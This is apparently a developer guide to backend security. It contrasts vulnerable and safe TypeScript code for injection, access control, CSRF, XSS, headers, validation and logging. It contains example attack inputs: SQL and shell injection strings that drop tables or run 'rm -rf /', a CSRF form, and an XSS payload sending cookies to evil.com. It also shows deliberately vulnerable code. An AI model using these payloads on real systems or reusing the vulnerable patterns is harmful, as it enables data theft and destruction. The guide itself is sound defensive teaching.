# Backend Security

## Mental model: trust boundaries

Security is about enforcing trust boundaries. Your API sits between the internet (untrusted) and your database and infrastructure (trusted). Everything crossing that boundary must be validated, authenticated, and authorized before acting on it.

The core rules:
1. Never trust client input — validate and sanitize everything
2. Least privilege — every component gets only the access it needs
3. Defense in depth — don't rely on a single security control
4. Fail securely — errors should not expose information or grant access

---

## Injection attacks

### SQL injection

SQL injection happens when user input is interpolated directly into a SQL query, allowing an attacker to manipulate the query.

```typescript
// VULNERABLE — never do this
const userId = req.params.id;  // attacker sends: "1 OR 1=1"
const result = await db.query(`SELECT * FROM users WHERE id = ${userId}`);
// Executes: SELECT * FROM users WHERE id = 1 OR 1=1
// Returns every user in the database
```

More dangerous example — attacker sends `id` as `1; DROP TABLE users; --`:
```sql
SELECT * FROM users WHERE id = 1; DROP TABLE users; --
```

**Prevention: always use parameterized queries or an ORM**

```typescript
// Safe — parameterized query, value is never interpolated into SQL
const result = await db.query('SELECT * FROM users WHERE id = $1', [userId]);

// Safe — Prisma/Drizzle always parameterize automatically
const user = await db.user.findUnique({ where: { id: userId } });
```

ORMs like Prisma and Drizzle make SQL injection nearly impossible by construction. If you ever write raw SQL, always use the parameterized form.

### NoSQL injection

NoSQL databases like MongoDB are also vulnerable to injection, just differently. If you're using MongoDB directly:

```typescript
// VULNERABLE — attacker sends: { "$gt": "" } as the password
const user = await db.collection('users').findOne({
  email: req.body.email,
  password: req.body.password,  // { "$gt": "" } matches any non-empty string
});

// Safe — validate the shape of input before using it
import { z } from 'zod';
const LoginSchema = z.object({
  email: z.string().email(),
  password: z.string().min(1).max(100),
});
const { email, password } = LoginSchema.parse(req.body);
```

### Command injection

If your app ever runs shell commands:

```typescript
// VULNERABLE
const filename = req.query.filename;
exec(`convert ${filename} output.png`);
// Attacker sends: "image.jpg; rm -rf /"

// Safe — use the argument array form, never string interpolation
execFile('convert', [filename, 'output.png']);

// Better — don't run shell commands at all if possible
// Use a library instead (e.g. sharp for image processing)
```

---

## Authentication and session security

### Brute force and credential stuffing

Without rate limiting, an attacker can try millions of password combinations or use leaked credential databases.

```typescript
import rateLimit from 'express-rate-limit';
import slowDown from 'express-slow-down';

// Hard limit: block after 10 failed attempts per 15 minutes
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 10,
  skipSuccessfulRequests: true,  // only count failures
});

// Soft limit: add delay after 5 attempts (makes brute force impractical)
const loginSlowDown = slowDown({
  windowMs: 15 * 60 * 1000,
  delayAfter: 5,
  delayMs: (hits) => hits * 500,  // 500ms, 1000ms, 1500ms...
});

app.post('/auth/login', loginLimiter, loginSlowDown, loginHandler);
```

### Password storage

```typescript
import * as argon2 from 'argon2';

// Hashing (on registration)
const hash = await argon2.hash(password);  // argon2id by default
await db.user.create({ data: { email, passwordHash: hash } });

// Verifying (on login)
const user = await db.user.findUnique({ where: { email } });
if (!user || !(await argon2.verify(user.passwordHash, password))) {
  // Generic error — don't reveal which was wrong
  throw new ApiError(401, 'INVALID_CREDENTIALS', 'Invalid email or password');
}
```

Never store plaintext passwords. Never use MD5 or SHA-1 for passwords (they're too fast — optimized for speed, not security). Use argon2id or bcrypt (cost factor 12 minimum).

### Timing attacks on token comparison

When comparing tokens (password reset tokens, API keys, etc.), a naive string comparison leaks timing information. An attacker can measure how long the comparison takes to figure out how many characters match.

```typescript
import { timingSafeEqual, randomBytes } from 'crypto';

// Vulnerable — short-circuits as soon as characters differ
if (providedToken === storedToken) { ... }

// Safe — always takes the same amount of time regardless of where characters differ
function safeCompare(a: string, b: string): boolean {
  if (a.length !== b.length) return false;
  return timingSafeEqual(Buffer.from(a), Buffer.from(b));
}
```

---

## Broken access control

This is consistently the #1 vulnerability class (OWASP 2021). It means users can access or modify resources they shouldn't be able to.

### Insecure direct object reference (IDOR)

```typescript
// VULNERABLE — user can modify any order by guessing the ID
app.patch('/orders/:id', requireAuth, async (req, res) => {
  const order = await db.order.update({
    where: { id: req.params.id },
    data: req.body,
  });
  res.json(order);
});

// Safe — verify the user owns this resource
app.patch('/orders/:id', requireAuth, async (req, res) => {
  const order = await db.order.findUnique({
    where: { id: req.params.id },
  });

  if (!order) throw new ApiError(404, 'NOT_FOUND', 'Order not found');
  
  // Check ownership
  if (order.userId !== req.user.id) {
    throw new ApiError(403, 'FORBIDDEN', 'Not your order');
  }

  const updated = await db.order.update({
    where: { id: req.params.id },
    data: req.body,
  });
  res.json(updated);
});
```

Alternatively, always scope queries by the current user so unauthorized resources simply don't exist:

```typescript
// The query itself enforces authorization — if the order isn't theirs, it returns null
const order = await db.order.findUnique({
  where: { id: req.params.id, userId: req.user.id },
});
if (!order) throw new ApiError(404, 'NOT_FOUND', 'Order not found');
// Note: return 404, not 403 — don't confirm the resource exists to unauthorized users
```

### Mass assignment

Mass assignment happens when you pass user-supplied data directly to your database update, allowing users to modify fields they shouldn't be able to.

```typescript
// VULNERABLE — user can send { role: "admin", verified: true } in the body
app.patch('/users/:id', requireAuth, async (req, res) => {
  const user = await db.user.update({
    where: { id: req.params.id },
    data: req.body,  // never do this
  });
  res.json(user);
});

// Safe — explicitly allow only the fields the user is permitted to change
const UpdateProfileSchema = z.object({
  name: z.string().min(1).max(100).optional(),
  bio: z.string().max(500).optional(),
});

app.patch('/users/:id', requireAuth, async (req, res) => {
  const data = UpdateProfileSchema.parse(req.body);  // strips any extra fields
  const user = await db.user.update({
    where: { id: req.params.id },
    data,
  });
  res.json(user);
});
```

---

## Cross-Site Request Forgery (CSRF)

CSRF tricks a user's browser into making a request to your API from another site. The browser automatically includes cookies, so if a user is logged in to your app, the malicious site can make authenticated requests on their behalf.

```html
<!-- On evil.com -->
<form action="https://yourapp.com/api/transfer" method="POST">
  <input type="hidden" name="amount" value="10000" />
  <input type="hidden" name="to" value="attacker-account" />
</form>
<script>document.forms[0].submit();</script>
```

**Mitigation 1: SameSite cookie attribute**

```
Set-Cookie: session=abc; SameSite=Lax; Secure; HttpOnly
```

`SameSite=Lax` prevents cookies from being sent on cross-site POST requests. This alone stops most CSRF attacks.

`SameSite=Strict` is more restrictive (no cross-site requests at all, including navigations). Use `Lax` for most apps.

**Mitigation 2: CSRF tokens (for older cookie-based flows)**

```typescript
import csrf from 'csurf';
app.use(csrf({ cookie: true }));

// In your form-rendering route, pass the token to the template
app.get('/transfer', (req, res) => {
  res.render('transfer', { csrfToken: req.csrfToken() });
});

// The form submits the token; csurf middleware validates it automatically
```

**Mitigation 3: Check the Origin header on state-changing requests**

```typescript
app.use((req, res, next) => {
  if (['POST', 'PUT', 'PATCH', 'DELETE'].includes(req.method)) {
    const origin = req.headers.origin;
    if (origin && origin !== process.env.ALLOWED_ORIGIN) {
      return res.status(403).json({ error: 'CSRF check failed' });
    }
  }
  next();
});
```

---

## Cross-Site Scripting (XSS)

XSS happens when your app renders user-supplied content as HTML, allowing an attacker to inject scripts that run in other users' browsers.

```html
<!-- User submits this as their username: -->
<script>document.location='https://evil.com/steal?c='+document.cookie</script>

<!-- If your app renders it directly into HTML: -->
<p>Welcome, <script>document.location=...</script></p>
<!-- Every user who sees this page runs the attacker's script -->
```

**Prevention:**

1. **Use a framework that escapes by default.** React, Vue, and Angular all HTML-escape content by default. Never use `dangerouslySetInnerHTML` with user content.

2. **Sanitize HTML if you must render it.** If users can submit rich text (e.g. a blog editor), sanitize it server-side before storage and display:
```typescript
import DOMPurify from 'isomorphic-dompurify';
const cleanHtml = DOMPurify.sanitize(userHtml, { ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'] });
```

3. **Content Security Policy (CSP) as defense in depth** (see security headers section below).

---

## Security headers

HTTP response headers are one of the cheapest security improvements you can make. Set them on every response.

```typescript
import helmet from 'helmet';  // sets many security headers automatically

app.use(helmet());
```

What Helmet sets (and why):

```
Content-Security-Policy: default-src 'self'
  → Tells browsers which sources are allowed to load scripts, styles, images.
    Even if XSS happens, this limits what scripts can run and where data can be sent.

X-Frame-Options: DENY
  → Prevents your page from being embedded in an iframe on another site (clickjacking).

X-Content-Type-Options: nosniff
  → Prevents browsers from guessing the content type of a response.
    Without this, a browser might execute a text file as JavaScript.

Strict-Transport-Security: max-age=31536000; includeSubDomains
  → Tells browsers to only connect over HTTPS for the next year.
    Even if a user types http://, the browser upgrades to https://.

Referrer-Policy: no-referrer-when-downgrade
  → Controls how much URL information is sent in the Referer header.

Permissions-Policy: camera=(), microphone=(), geolocation=()
  → Disables browser features your app doesn't use.
```

Configure CSP specifically for your app — the default is strict and may break things:

```typescript
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"],
    styleSrc: ["'self'", "'unsafe-inline'"],  // if you use inline styles
    imgSrc: ["'self'", 'data:', 'https://your-cdn.com'],
    connectSrc: ["'self'", 'https://api.yourapp.com'],
    fontSrc: ["'self'", 'https://fonts.gstatic.com'],
    objectSrc: ["'none'"],
    frameAncestors: ["'none'"],
  },
}));
```

---

## Sensitive data exposure

### What not to return from your API

```typescript
// VULNERABLE — returns password hash, internal IDs, admin flags, etc.
app.get('/users/:id', async (req, res) => {
  const user = await db.user.findUnique({ where: { id: req.params.id } });
  res.json(user);  // sends everything including passwordHash
});

// Safe — explicitly select only what the client needs
app.get('/users/:id', async (req, res) => {
  const user = await db.user.findUnique({
    where: { id: req.params.id },
    select: { id: true, name: true, email: true, createdAt: true },
  });
  res.json(user);
});
```

Never return: password hashes, internal system IDs that reveal infrastructure, session tokens, full credit card numbers, API keys, or any column you wouldn't want displayed publicly.

### Environment variables and secrets

```typescript
// VULNERABLE — leaks all env vars if this endpoint is called
app.get('/debug', (req, res) => {
  res.json({ env: process.env });
});

// Never commit secrets to git. Use .env.local (in .gitignore).
// Rotate secrets immediately if they're ever committed by accident.
```

Check your repo for secrets that were accidentally committed: https://github.com/gitleaks/gitleaks

### Error messages

In production, never return stack traces or internal error messages to clients. They reveal your framework, library versions, file paths, and code structure.

```typescript
app.use((err, req, res, next) => {
  // Log the full error internally for debugging
  console.error(err);
  
  const isProd = process.env.NODE_ENV === 'production';
  res.status(err.statusCode ?? 500).json({
    error: {
      code: err.code ?? 'INTERNAL_ERROR',
      // In production: generic message. In development: the real message.
      message: isProd && !err.statusCode ? 'Something went wrong' : err.message,
      // Never include stack trace in production
      ...(isProd ? {} : { stack: err.stack }),
    }
  });
});
```

---

## Input validation (comprehensive)

Validate at the boundary. Every request that touches your application logic should have been validated first.

```typescript
import { z } from 'zod';

// Validate types, shapes, lengths, formats, and ranges
const CreatePostSchema = z.object({
  title: z.string()
    .min(1, 'Title is required')
    .max(200, 'Title too long'),
  content: z.string()
    .min(1, 'Content is required')
    .max(50000, 'Content too long'),  // prevent storing multi-MB strings
  tags: z.array(z.string().max(50)).max(10),  // max 10 tags, each max 50 chars
  status: z.enum(['draft', 'published']),
});

// Validate path parameters too — don't assume a UUID is actually a UUID
const ParamsSchema = z.object({
  id: z.string().uuid('Invalid ID format'),
});

app.post('/posts', requireAuth, async (req, res) => {
  const params = ParamsSchema.safeParse(req.params);
  const body = CreatePostSchema.safeParse(req.body);
  
  if (!params.success || !body.success) {
    throw new ApiError(400, 'VALIDATION_ERROR', 'Invalid input');
  }
  // ...
});
```

**Always validate:**
- Types (is this actually a number, not a string containing a script?)
- Lengths (prevent storing arbitrary amounts of data)
- Formats (is this actually a valid email, UUID, URL?)
- Ranges (is this number between 1 and 100 as expected?)
- Enum values (is this status one of the allowed values?)

---

## Dependency security

Your application is only as secure as its dependencies. Dependencies are a major attack surface.

```bash
# Check for known vulnerabilities in your dependencies
npm audit

# Fix automatically where possible
npm audit fix

# Review what's being installed — avoid packages with very few downloads or recent creation dates
```

Key practices:
- Pin dependency versions in production (use lockfiles — `package-lock.json` or `yarn.lock`)
- Run `npm audit` in CI and fail the build on high-severity vulnerabilities
- Keep dependencies updated — most security patches are in minor or patch versions
- Minimise dependencies — every package you don't have is a package that can't be compromised

---

## Rate limiting (comprehensive)

Rate limiting prevents abuse, brute force, and denial of service. Apply different limits to different endpoints based on sensitivity.

```typescript
import rateLimit from 'express-rate-limit';
import RedisStore from 'rate-limit-redis';
import { redis } from './redis';

// For production, use Redis store so limits work across multiple server instances
const makeRateLimiter = (max: number, windowMs: number) => rateLimit({
  windowMs,
  max,
  standardHeaders: true,   // return rate limit info in headers
  legacyHeaders: false,
  store: new RedisStore({ sendCommand: (...args) => redis.sendCommand(args) }),
  handler: (req, res) => {
    res.status(429).json({
      error: {
        code: 'RATE_LIMITED',
        message: 'Too many requests',
        retryAfter: Math.ceil(windowMs / 1000),
      }
    });
  },
});

// Tiered limits for different endpoint sensitivity
export const generalLimiter = makeRateLimiter(100, 60 * 1000);       // 100/min
export const authLimiter = makeRateLimiter(10, 15 * 60 * 1000);      // 10/15min
export const passwordResetLimiter = makeRateLimiter(3, 60 * 60 * 1000); // 3/hour

app.use('/api', generalLimiter);
app.post('/api/auth/login', authLimiter);
app.post('/api/auth/register', authLimiter);
app.post('/api/auth/forgot-password', passwordResetLimiter);
```

---

## Logging for security

Security logs are your forensic trail — when an incident happens, logs tell you what occurred, when, and from where.

**Log these events:**
- All authentication attempts (success and failure) with IP address
- All authorization failures (403 responses)
- All administrative actions
- All password/email change events
- Rate limit hits

**Never log:**
- Passwords (even failed ones)
- Session tokens
- Full credit card numbers
- Personal health information

```typescript
// Structured logging with context
logger.warn({
  event: 'auth.login.failure',
  email: req.body.email,  // OK to log the email
  ip: req.ip,
  userAgent: req.headers['user-agent'],
  timestamp: new Date().toISOString(),
});

logger.info({
  event: 'auth.login.success',
  userId: user.id,
  ip: req.ip,
});
```

Use a structured logging library (Pino, Winston) that outputs JSON — it makes logs searchable in tools like Datadog, Logtail, or CloudWatch.